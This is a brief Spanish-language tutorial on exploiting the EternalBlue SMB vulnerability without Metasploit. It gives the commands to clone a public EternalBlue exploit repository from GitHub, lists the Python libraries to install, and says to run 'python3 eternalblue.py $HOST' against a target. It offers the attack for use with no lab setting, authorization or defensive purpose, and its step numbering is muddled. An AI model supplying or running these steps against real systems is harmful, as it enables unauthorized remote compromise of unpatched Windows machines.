Cómo explotar el eternal blue sin metasploit.

1-Descargar el exploit.

Para hacerlo solo debemos ejecutar el siguiente comando:

git clone https://github.com/rhmoult/EternalBlue && cd EternalBlue

Recordad que existen muchos exploits en internet, este es uno que seleccioné para este tutorial.

2-Verificar que tienes los requerimientos necesarios.

Debes instalar las siguientes librerías: impacket, struct, os, sys, socket.

1-Ejecutar la herramienta.

Para hacerlo solo tenéis que ejecutar el siguiente comando: python3 eternalblue.py $HOST

Y de esa manera puedes explotar el eternal blue sin metasploit.
